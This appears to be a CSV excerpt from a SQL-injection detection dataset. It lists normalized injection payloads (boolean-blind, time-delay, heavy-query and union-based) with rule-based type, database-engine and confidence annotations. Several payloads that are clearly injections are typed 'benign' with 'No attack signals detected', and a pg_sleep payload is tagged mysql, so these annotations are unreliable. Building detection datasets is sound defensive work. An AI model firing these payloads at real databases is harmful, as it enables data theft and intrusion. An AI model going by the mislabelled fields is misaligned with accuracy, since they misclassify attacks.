row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1830,"1"" ) as rgod where 5766 = 5766 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,,boolean_blind,generic,0.95,5766 = 5766 or detected — boolean_blind injection (priority 8) on generic,rule-based
1831,1' ) ) as dckd where 1794 = 1794,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1832,1' waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1833,"1"" ) ) ) and 4595 = 4595#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1834,"1"" where 8016 = 8016",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1835,select pg_sleep ( 5 ) and ( ( ( '%' = ',1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1836,"1, ( select ( case when ( 8382 = 8382 ) then 1 else 1/ ( select 0 ) end ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1837,select ( case when ( 4624 = 4844 ) then 4624 else 1/ ( select 0 ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1838,"1"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""uisi"" = ""uisi",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
1839,"1' ) where 7561 = 7561 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
1840,"1"" ) ) ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( ""atlz"" = ""atlz",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
1841,"-5661' ) ) union all select 3011,3011#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1842,"1', ( select ( case when ( 6560 = 2813 ) then 1 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
